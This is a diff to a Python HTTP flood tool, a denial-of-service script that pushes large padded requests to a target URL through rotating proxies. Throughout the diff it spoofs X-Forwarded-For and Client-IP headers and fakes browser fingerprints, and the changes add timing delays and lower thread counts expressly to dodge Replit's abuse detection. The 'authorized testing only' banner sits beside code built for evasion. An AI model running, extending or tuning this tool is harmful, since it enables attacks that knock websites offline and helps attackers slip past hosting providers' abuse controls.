@@ -17,7 +17,7 @@ try:
     init(autoreset=True)
 except ModuleNotFoundError as e:
     print(f"Error: {e}. Please install colorama and fake_useragent using 'pip install colorama fake_useragent'")
-    exit()
+    sys.exit(1)
 
 # Configure logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -27,22 +27,22 @@ success_count = 0
 total_bytes_sent = 0
 ssl_failures = 0
 proxy_failures = 0
-active_proxies = []
+active_proxies = {}
 proxy_lock = threading.Lock()
 ua = UserAgent()
 
 # Clear screen
-def clear_text():
-    os.system('cls' if platform.system().upper() == "WINDOWS" else 'clear')
+def clear_screen():
+    os.system('cls' if platform.system().lower() == 'windows' else 'clear')
 
 # Generate random URL path
 def generate_url_path():
     endpoints = [
-        f"api/v{random.randint(1, 3)}/{random.choice(['user', 'product', 'cart', 'order'])}/{generate_random_string(8)}",
-        f"blog/post/{generate_random_string(12)}",
-        f"search?q={generate_random_string(10)}",
-        f"assets/js/{generate_random_string(12)}.js",
-        f"content/{random.choice(['article', 'page'])}/{random.randint(100, 999)}",
+        f'api/v{random.randint(2, 4)}/{random.choice(["user", "product", "cart", "order", "auth"])}/{generate_random_string(10)}',
+        f"shop/item/{generate_random_string(8)}",
+        f"blog/article/{generate_random_string(12)}",
+        f"search?query={generate_random_string(10)}",
+        f"static/js/{generate_random_string(12)}.min.js",
     ]
     return random.choice(endpoints)
 
@@ -55,7 +55,7 @@ def generate_random_string(length):
 def generate_large_payload(size=1024):
     return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(size))
 
-# Generate random IP for X-Forwarded-For
+# Generate random IP for headers
 def generate_random_ip():
     return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
 
@@ -66,8 +66,8 @@ def load_proxies(filename="ProxyList.txt", target_ip=None, target_port=None):
         with open(filename, 'r') as f:
             proxies = [line.strip() for line in f if line.strip()]
         logging.info(f"Loaded {len(proxies)} proxies from {filename}")
-        active_proxies = []
-        with ThreadPoolExecutor(max_workers=100) as executor:
+        active_proxies = {}
+        with ThreadPoolExecutor(max_workers=50) as executor:
             futures = [executor.submit(test_proxy, proxy, target_ip, target_port) for proxy in proxies]
             for future in futures:
                 future.result()
@@ -92,7 +92,7 @@ def test_proxy(proxy, target_ip=None, target_port=None):
             if "200 Connection established" not in response:
                 raise ConnectionError("Proxy failed to establish connection")
         with proxy_lock:
-            active_proxies.append(proxy)
+            active_proxies[proxy] = time.time()  # Store proxy with timestamp
         logging.debug(f"Proxy {proxy} is active")
     except (socket.error, ValueError, ConnectionError):
         logging.debug(f"Proxy {proxy} failed")
@@ -102,7 +102,15 @@ def test_proxy(proxy, target_ip=None, target_port=None):
 # Get random proxy
 def get_random_proxy():
     with proxy_lock:
-        return random.choice(active_proxies) if active_proxies else None
+        if not active_proxies:
+            return None
+        proxy = random.choice(list(active_proxies.keys()))
+        # Remove old proxies (older than 10 minutes)
+        current_time = time.time()
+        if current_time - active_proxies[proxy] > 600:
+            del active_proxies[proxy]
+            return get_random_proxy()
+        return proxy
 
 # Header lists for randomization
 accepts = [
@@ -120,12 +128,13 @@ referers = [
 content_types = ["application/x-www-form-urlencoded", "multipart/form-data", "application/json"]
 origins = [f"https://{random.choice(['example.com', 'test.com', 'dummy.com'])}"]
 sec_ch_ua = [
-    '"Google Chrome";v="120", "Chromium";v="120", "Not?A_Brand";v="24"',
-    '"Firefox";v="121", "Gecko";v="20100101"',
+    '"Google Chrome";v="122", "Chromium";v="122", "Not-A.Brand";v="24"',
+    '"Firefox";v="123", "Gecko";v="20100101"',
 ]
+sec_ch_ua_platform = ['"Windows"', '"Linux"', '"macOS"', '"Android"']
 
 # Attack logic
-def DoS_Attack(ip, host, port, type_attack, booster_sent, data_type_loader_packet, use_ssl=False, retry_count=2):
+def DoS_Attack(ip, host, port, type_attack, booster_sent, data_type_loader_packet, use_ssl=False, retry_count=3):
     global success_count, total_bytes_sent, ssl_failures, proxy_failures
     if stop_attack.is_set():
         return
@@ -137,11 +146,11 @@ def DoS_Attack(ip, host, port, type_attack, booster_sent, data_type_loader_packe
             logging.error("No active proxies available")
             return
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(45)  # 45s timeout for proxy and HTTPS
+        s.settimeout(60)  # 60s timeout for Replit
         if use_ssl:
             context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
             context.set_ciphers('TLS_AES_256_GCM_SHA384:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256')
-            context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1  # Force TLS 1.2 or higher
+            context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_TLSv1_2  # Force TLS 1.3
             s = context.wrap_socket(s, server_hostname=host)
         try:
             proxy_ip, proxy_port = proxy.split(':')
@@ -164,11 +173,13 @@ def DoS_Attack(ip, host, port, type_attack, booster_sent, data_type_loader_packe
                     f"Origin: {random.choice(origins)}\n"
                     f"Cookie: session={generate_random_string(16)}; token={generate_random_string(32)}\n"
                     f"Sec-Ch-Ua: {random.choice(sec_ch_ua)}\n"
-                    f"Sec-Fetch-Site: cross-site\n"
+                    f"Sec-Ch-Ua-Platform: {random.choice(sec_ch_ua_platform)}\n"
+                    f"Sec-Fetch-Site: same-origin\n"
                     f"Sec-Fetch-Mode: navigate\n"
                     f"Sec-Fetch-Dest: document\n"
                     f"DNT: 1\n"
                     f"X-Forwarded-For: {generate_random_ip()}\n"
+                    f"Client-IP: {generate_random_ip()}\n"
                     f"Upgrade-Insecure-Requests: 1\n"
                     f"Content-Type: {random.choice(content_types)}\n"
                     f"Content-Length: 1024\n\n"
@@ -186,11 +197,13 @@ def DoS_Attack(ip, host, port, type_attack, booster_sent, data_type_loader_packe
                     f"Origin: {random.choice(origins)}\n"
                     f"Cookie: session={generate_random_string(16)}; token={generate_random_string(32)}\n"
                     f"Sec-Ch-Ua: {random.choice(sec_ch_ua)}\n"
-                    f"Sec-Fetch-Site: cross-site\n"
+                    f"Sec-Ch-Ua-Platform: {random.choice(sec_ch_ua_platform)}\n"
+                    f"Sec-Fetch-Site: same-origin\n"
                     f"Sec-Fetch-Mode: navigate\n"
                     f"Sec-Fetch-Dest: document\n"
                     f"DNT: 1\n"
                     f"X-Forwarded-For: {generate_random_ip()}\n"
+                    f"Client-IP: {generate_random_ip()}\n"
                     f"Upgrade-Insecure-Requests: 1\n"
                     f"Content-Type: {random.choice(content_types)}\n"
                     f"Content-Length: 8192\n\n"
@@ -208,11 +221,13 @@ def DoS_Attack(ip, host, port, type_attack, booster_sent, data_type_loader_packe
                     f"Origin: {random.choice(origins)}\n"
                     f"Cookie: session={generate_random_string(16)}; token={generate_random_string(32)}\n"
                     f"Sec-Ch-Ua: {random.choice(sec_ch_ua)}\n"
-                    f"Sec-Fetch-Site: cross-site\n"
+                    f"Sec-Ch-Ua-Platform: {random.choice(sec_ch_ua_platform)}\n"
+                    f"Sec-Fetch-Site: same-origin\n"
                     f"Sec-Fetch-Mode: navigate\n"
                     f"Sec-Fetch-Dest: document\n"
                     f"DNT: 1\n"
                     f"X-Forwarded-For: {generate_random_ip()}\n"
+                    f"Client-IP: {generate_random_ip()}\n"
                     f"Upgrade-Insecure-Requests: 1\n"
                     f"Content-Type: {random.choice(content_types)}\n"
                     f"Content-Length: 32768\n\n"
@@ -230,11 +245,13 @@ def DoS_Attack(ip, host, port, type_attack, booster_sent, data_type_loader_packe
                     f"Origin: {random.choice(origins)}\n"
                     f"Cookie: session={generate_random_string(16)}; token={generate_random_string(32)}\n"
                     f"Sec-Ch-Ua: {random.choice(sec_ch_ua)}\n"
-                    f"Sec-Fetch-Site: cross-site\n"
+                    f"Sec-Ch-Ua-Platform: {random.choice(sec_ch_ua_platform)}\n"
+                    f"Sec-Fetch-Site: same-origin\n"
                     f"Sec-Fetch-Mode: navigate\n"
                     f"Sec-Fetch-Dest: document\n"
                     f"DNT: 1\n"
                     f"X-Forwarded-For: {generate_random_ip()}\n"
+                    f"Client-IP: {generate_random_ip()}\n"
                     f"Upgrade-Insecure-Requests: 1\n"
                     f"Content-Type: {random.choice(content_types)}\n"
                     f"Content-Length: 65536\n\n"
@@ -252,11 +269,13 @@ def DoS_Attack(ip, host, port, type_attack, booster_sent, data_type_loader_packe
                     f"Origin: {random.choice(origins)}\n"
                     f"Cookie: session={generate_random_string(16)}; token={generate_random_string(32)}\n"
                     f"Sec-Ch-Ua: {random.choice(sec_ch_ua)}\n"
-                    f"Sec-Fetch-Site: cross-site\n"
+                    f"Sec-Ch-Ua-Platform: {random.choice(sec_ch_ua_platform)}\n"
+                    f"Sec-Fetch-Site: same-origin\n"
                     f"Sec-Fetch-Mode: navigate\n"
                     f"Sec-Fetch-Dest: document\n"
                     f"DNT: 1\n"
                     f"X-Forwarded-For: {generate_random_ip()}\n"
+                    f"Client-IP: {generate_random_ip()}\n"
                     f"Upgrade-Insecure-Requests: 1\n"
                     f"Content-Type: {random.choice(content_types)}\n"
                     f"Content-Length: 131072\n\n"
@@ -274,11 +293,13 @@ def DoS_Attack(ip, host, port, type_attack, booster_sent, data_type_loader_packe
                     f"Origin: {random.choice(origins)}\n"
                     f"Cookie: session={generate_random_string(16)}; token={generate_random_string(32)}\n"
                     f"Sec-Ch-Ua: {random.choice(sec_ch_ua)}\n"
-                    f"Sec-Fetch-Site: cross-site\n"
+                    f"Sec-Ch-Ua-Platform: {random.choice(sec_ch_ua_platform)}\n"
+                    f"Sec-Fetch-Site: same-origin\n"
                     f"Sec-Fetch-Mode: navigate\n"
                     f"Sec-Fetch-Dest: document\n"
                     f"DNT: 1\n"
                     f"X-Forwarded-For: {generate_random_ip()}\n"
+                    f"Client-IP: {generate_random_ip()}\n"
                     f"Upgrade-Insecure-Requests: 1\n"
                     f"Content-Type: {random.choice(content_types)}\n"
                     f"Content-Length: 262144\n\n"
@@ -296,11 +317,13 @@ def DoS_Attack(ip, host, port, type_attack, booster_sent, data_type_loader_packe
                     f"Origin: {random.choice(origins)}\n"
                     f"Cookie: session={generate_random_string(16)}; token={generate_random_string(32)}\n"
                     f"Sec-Ch-Ua: {random.choice(sec_ch_ua)}\n"
-                    f"Sec-Fetch-Site: cross-site\n"
+                    f"Sec-Ch-Ua-Platform: {random.choice(sec_ch_ua_platform)}\n"
+                    f"Sec-Fetch-Site: same-origin\n"
                     f"Sec-Fetch-Mode: navigate\n"
                     f"Sec-Fetch-Dest: document\n"
                     f"DNT: 1\n"
                     f"X-Forwarded-For: {generate_random_ip()}\n"
+                    f"Client-IP: {generate_random_ip()}\n"
                     f"Upgrade-Insecure-Requests: 1\n"
                     f"Content-Type: {random.choice(content_types)}\n"
                     f"Content-Length: 524288\n\n"
@@ -314,10 +337,11 @@ def DoS_Attack(ip, host, port, type_attack, booster_sent, data_type_loader_packe
                     break
                 s.sendall(packet_data)
                 sent_bytes += len(packet_data)
-                time.sleep(random.uniform(0.1, 2.0))  # Random delay to mimic human behavior
+                time.sleep(random.uniform(0.5, 3.0))  # Longer delay for Replit stealth
             with proxy_lock:
                 success_count += 1
                 total_bytes_sent += sent_bytes
+                active_proxies[proxy] = time.time()  # Update proxy timestamp
             logging.info(f"Successful connection via {proxy}: Sent {sent_bytes / 1024:.2f} KB to {ip}:{port}")
             break
         except (ssl.SSLEOFError, ssl.SSLZeroReturnError, ssl.SSLWantReadError) as e:
@@ -328,26 +352,28 @@ def DoS_Attack(ip, host, port, type_attack, booster_sent, data_type_loader_packe
             if attempts > retry_count:
                 with proxy_lock:
                     if proxy in active_proxies:
-                        active_proxies.remove(proxy)
+                        del active_proxies[proxy]
                         proxy_failures += 1
                 logging.warning(f"Proxy {proxy} removed due to repeated SSL failures")
         except (ConnectionError, TimeoutError, socket.gaierror) as e:
             with proxy_lock:
                 proxy_failures += 1
                 if proxy in active_proxies:
-                    active_proxies.remove(proxy)
+                    del active_proxies[proxy]
             logging.error(f"Connection error on {ip}:{port} via {proxy}: {type(e).__name__} - {str(e)}")
             attempts += 1
         finally:
             s.close()
+        time.sleep(random.uniform(1, 5))  # Delay between retries to avoid Replit detection
 
 # Running attack with ThreadPoolExecutor
 def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loader, booster_sent, data_type_loader_packet, use_ssl):
-    with ThreadPoolExecutor(max_workers=min(spam_loader, 10)) as executor:
+    with ThreadPoolExecutor(max_workers=min(spam_loader, 5)) as executor:
         while time.time() < time_loader and not stop_attack.is_set():
             futures = [executor.submit(DoS_Attack, ip, host, port_loader, methods_loader, booster_sent, data_type_loader_packet, use_ssl) for _ in range(spam_loader)]
             for future in futures:
                 future.result()
+            time.sleep(random.uniform(2, 10))  # Delay between batches for Replit stealth
 
 # Countdown + interrupt
 def countdown_timer(time_loader):
@@ -375,17 +401,17 @@ def countdown_timer(time_loader):
 def confirm_exit():
     while True:
         choice = input(f"{Fore.YELLOW}Exit program? (y/n): {Fore.RESET}").lower()
-        if choice == 'y':
+        if choice in ['y', 'yes']:
             print(f"{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
             sys.exit(0)
-        elif choice == 'n':
+        elif choice in ['n', 'no']:
             print()
             return
 
 # Validate URL and extract host, protocol
 def validate_target(target):
     try:
-        parsed = urlparse(target if target.startswith(('http://', 'https://')) else f'http://{target}')
+        parsed = urlparse(target if target.startswith(('http://', 'https://')) else f'https://{target}')
         host = parsed.hostname
         if not host:
             raise ValueError("Invalid URL")
@@ -400,8 +426,8 @@ def validate_target(target):
 # Main command loop
 def command():
     global stop_attack, success_count, total_bytes_sent, ssl_failures, proxy_failures
-    print(f"{Fore.RED}WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY. Unauthorized use is ILLEGAL and may result in severe legal consequences. Ensure you have explicit permission from the server owner before proceeding.{Fore.RESET}")
-    ip, host, use_ssl = validate_target(input(f"{Fore.CYAN}Enter target URL (e.g., https://example.com): {Fore.RESET}"))
+    print(f"{Fore.RED}WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY on YOUR OWN servers. Unauthorized use is ILLEGAL and may result in Replit account suspension or legal consequences. Ensure you have explicit permission before proceeding.{Fore.RESET}")
+    ip, host, use_ssl = validate_target(input(f"{Fore.CYAN}Enter target URL (e.g., https://your-own-site.com): {Fore.RESET}"))
     if not ip:
         print(f"{Fore.RED}Invalid target. Exiting...{Fore.RESET}")
         sys.exit(1)
@@ -415,7 +441,7 @@ def command():
 
             args_get = data_input_loader.split()
             if args_get[0].lower() == "clear":
-                clear_text()
+                clear_screen()
             elif args_get[0].upper() == "!FLOOD":
                 if len(args_get) == 9:
                     data_type_loader_packet = args_get[1].upper()
@@ -436,15 +462,15 @@ def command():
                         continue
                     try:
                         spam_loader = int(args_get[4])
-                        if spam_loader > 10000:
-                            print(f"{Fore.YELLOW}Warning: SPAM_THREAD > 10000 may overload your system. Proceed with caution.{Fore.RESET}")
+                        if spam_loader > 50:
+                            print(f"{Fore.YELLOW}Warning: SPAM_THREAD > 50 may trigger Replit detection. Proceed with caution.{Fore.RESET}")
                     except ValueError:
                         print(f"{Fore.RED}SPAM_THREAD must be a number{Fore.RESET}")
                         continue
                     try:
                         create_thread = int(args_get[5])
-                        if create_thread > 10000:
-                            print(f"{Fore.YELLOW}Warning: CREATE_THREAD > 10000 may overload your system. Proceed with caution.{Fore.RESET}")
+                        if create_thread > 50:
+                            print(f"{Fore.YELLOW}Warning: CREATE_THREAD > 50 may trigger Replit detection. Proceed with caution.{Fore.RESET}")
                     except ValueError:
                         print(f"{Fore.RED}CREATE_THREAD must be a number{Fore.RESET}")
                         continue
@@ -453,11 +479,14 @@ def command():
                     except ValueError:
                         print(f"{Fore.RED}BOOTER_SENT must be a number{Fore.RESET}")
                         continue
-                    methods_loader = args_get[7]
+                    methods_loader = args_get[7].upper()
+                    if methods_loader not in ['GET', 'POST']:
+                        print(f"{Fore.RED}HTTP_METHODS must be GET or POST{Fore.RESET}")
+                        continue
                     try:
                         spam_create_thread = int(args_get[8])
-                        if spam_create_thread > 10000:
-                            print(f"{Fore.YELLOW}Warning: SPAM_CREATE > 10000 may overload your system. Proceed with caution.{Fore.RESET}")
+                        if spam_create_thread > 50:
+                            print(f"{Fore.YELLOW}Warning: SPAM_CREATE > 50 may trigger Replit detection. Proceed with caution.{Fore.RESET}")
                     except ValueError:
                         print(f"{Fore.RED}SPAM_CREATE must be a number{Fore.RESET}")
                         continue
@@ -476,6 +505,7 @@ def command():
                     for _ in range(create_thread):
                         for _ in range(spam_create_thread):
                             threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booster_sent, data_type_loader_packet, use_ssl)).start()
+                        time.sleep(random.uniform(5, 15))  # Delay between thread groups for Replit stealth
 
                     countdown_timer(time_loader)
                     continue
